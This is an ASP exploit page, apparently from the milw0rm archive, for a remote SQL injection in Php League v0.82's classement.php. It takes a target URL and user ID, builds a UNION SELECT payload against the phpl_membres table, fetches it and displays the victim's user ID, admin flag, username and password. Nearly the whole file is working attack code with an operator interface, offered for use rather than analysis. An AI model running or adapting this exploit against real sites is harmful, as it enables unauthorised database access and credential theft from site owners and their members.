@@ -1,0 +1,179 @@
+<% Response.Buffer = True %>
+<% On Error Resume Next %>
+<% Server.ScriptTimeout = 100 %>
+
+<%
+'===============================================================================================
+'[Script Name: Php League v0.82 (classement.php) Remote SQL Injection Exploit
+'[Coded by   : ajann
+'[Author   : ajann
+'[Contact    : :(
+'[ExploitName: exploit2.asp
+
+'[Note : exploit file name =>exploit2.asp
+'[Note : If Wrong Id = "CTYPE html PUBLIC..... see"
+'[Using : Write Target and ID after Submit Click
+'===============================================================================================
+
+%>
+
+<html>
+<title>Php League v0.82 (classement.php) Remote SQL Injection Exploit</title>
+<head>
+
+<script language="JavaScript">    
+  function functionControl1(){  
+        setTimeout("functionControl2()",2000);    
+     }  
+  
+  function functionControl2(){  
+            if(document.form1.field1.value==""){  
+ 
+     alert("[Exploit Failed]=>The Username and Password Didnt Take,Try Again");
+        
+                             }  
+                        }
+
+  function writetext() {
+
+            if(document.form1.field1.value==""){
+document.getElementById('htmlAlani').innerHTML='<font face=\"Verdana\" size=\"1\" color=\"#008000\">There is a problem... The Data Didn\'t Take </font>'
+
+                            }
+                 }
+  function write(){  
+        setTimeout("writetext()",1000);    
+     }  
+  
+</script>
+
+
+</head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<body bgcolor="#000000" link="#008000" vlink="#008000" alink="#008000">
+
+<center>
+<font face="Verdana" size="2" color="#008000"><b><a href="exploit2.asp">Php League</b>v0.82 (classement.php) <u><b>
+Remote SQL Injection Exploit</b></u></a></font><br><br>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080" bordercolordark="#008000" bordercolor="#808080">
+  <tr>
+    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">
+    <font face="Arial" size="1"><b><font color="#FFFFFF">TARGET:</font>Example:[http://x.com/path]</b></font><p>
+    <b><font face="Arial" size="1" color="#FFFFFF">USER ID:</font></b><font face="Arial" size="1"><b>Example:[User 
+    ID=1]</b></font></td>
+    <td width="50%"><center>
+<form method="post" name="form1" action="exploit2.asp?islem=get">
+<input type="text" name="text1" value="http://" size="25" style="background-color: #808080"><br><input type="text" name="id" value="10" size="25" style="background-color: #808080">
+<input type="submit" value="Get"></center></td>
+  </tr>
+
+</table>
+
+<div id=htmlAlani></div>
+
+<%
+islem = Request.QueryString("islem")    
+If islem = "hata1" Then 
+Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Please complete to the whole spaces</font>"
+End If
+If islem = "hata2" Then 
+Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Please right character use</font>"
+End If
+If islem = "hata3" Then 
+Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Add ""http://""</font>"
+End If
+%>
+
+<%  
+
+If islem = "get" Then
+
+string2="/consult/classement.php?champ='"
+string3="%20union%20select%200,0,concat(char(85),char(115),"
+string4="char(101),char(114),char(73),char(68),char(58),"
+string5="id,char(32),char(65),char(100),char(109)"
+string6=",char(105),char(110),char(63),char(58),admin,char(32),char(85),"
+string7="char(115),char(101),char(114),char(78),char(97),char(109),"
+string8="char(101),char(58),pseudo,char(32),char(80),char(97),char(115),"
+string9="char(115),char(58),char(13),char(10),mot_de_passe)"
+string10="%20from%20phpl_membres%20where"
+string11="%20id%20like%20"
+string12=Request.Form("id")
+string13="/*"
+
+targettext = Request.Form("text1")
+arama=InStr(1, targettext, "union" ,1)
+arama2=InStr(1, targettext, "http://" ,1)
+
+If targettext="" Then
+Response.Redirect("exploit2.asp?islem=hata1")
+
+Else
+If arama>0 then 
+Response.Redirect("exploit2.asp?islem=hata2")
+
+Else
+If arama2=0 then 
+Response.Redirect("exploit2.asp?islem=hata3")
+
+Else
+%> 
+
+<%
+
+target1 = targettext+string2+string3+string4+string5+string6+string7+string8+string9+string10+string11+string12+string13
+
+Public Function take(come)
+Set objtake = Server.CreateObject("Microsoft.XMLHTTP" )
+With objtake
+  .Open "GET" , come, FALSE
+  .sEnd
+take =  .Responsetext
+End With
+SET objtake = Nothing
+End Function
+
+get_username = take(target1)
+
+getdata=InStr(get_username,"0  0/" )
+username=Mid(get_username,getdata+5,90)
+
+
+%>
+<center>
+<font face="Verdana" size="2" color="#008000"> <u><b>
+ajann<br></b></u></font>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080" bordercolordark="#008000" bordercolor="#808080">
+  <tr>
+    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <b><font size="2" face="Arial">Data:</font></b></td>
+    <td width="80%">
+&nbsp;<b><font color="#C0C0C0" size="2" face="Verdana"><%=username%></b></font></p>
+ </td>
+  </tr>
+  
+</table>
+
+<form method="POST" name="form2" action="#">    
+<input type="hidden" name="field1" size="20" value="<%=username%>"></p>      
+</form> 
+
+</center>
+
+<script language="JavaScript">
+write()
+functionControl1()
+</script>
+
+</body>
+</html>
+
+<%
+End If
+End If
+End If
+End If
+Set objtake = Nothing 
+%>
+
+# milw0rm.com [2006-10-27]
